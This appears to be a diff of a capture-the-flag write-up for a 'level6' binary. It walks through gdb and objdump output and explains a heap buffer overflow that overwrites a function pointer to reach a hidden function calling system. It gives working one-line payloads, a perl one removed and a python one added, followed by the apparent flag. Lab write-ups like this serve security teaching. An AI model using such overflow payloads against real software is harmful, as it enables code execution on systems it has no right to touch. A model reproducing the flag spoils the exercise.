@@ -1,17 +1,35 @@
-We saw a n function that give us our flag. This n function is never called.
-So we need to find a way to call it.
+$ ./level6
+=> Segmentation fault (core dumped)
+$ ./level6 asdfasdf
+=> Nope
 
-In the main function, there are 2 mallocs.
-The first one is a buffer, the second one is a function pointer.
-The function pointer is initilized with m function address.
-The buffer is filled with argv[1].
+ disas the <main>
+$ gdb level6
+$ (gdb) disas main
+there's many interesting things here :
+        0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+        0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+        0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+        0x080484d0 <+84>:	call   *%eax
 
-buf ptr addr = 0x804a008
-fn ptr addr  = 0x804a050
+So there's two call to <malloc>, one is for a 64 bytes buffer and the other one is for a function pointer.
+This function pointer is initialized with this address : 0x08048468
+Which is the address of the function <m>
+$ (gdb) disas m
+        0x08048475 <+13>:	call   0x8048360 <puts@plt>
+It's only writting "Nope";
 
-In the heap, we can see that both alloced variables are following.
+but, as we look through the dump
+$ objdump -d level6
+   08048454 <n>:
+    8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
+
+We can find this function which isn't called and has a <system> call that display the flag.
+
+In the heap, we can see that our both malloced variables are following.
 So if we overflow the buffer enough, it will overwrite the function pointer.
 
-```
-./level6 $(perl -e 'print "A"x64 . "B"x8 . "\x54\x84\x04\x08"')
-```
+Thanks to strcpy that's copying our first argument (argv[1]) into our buffer, we can try to overflow and overwrite the address of our function pointer with the address of the <n> function.
+
+./level6 $(python -c 'print ("A"*72 + "\x54\x84\x04\x08")')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
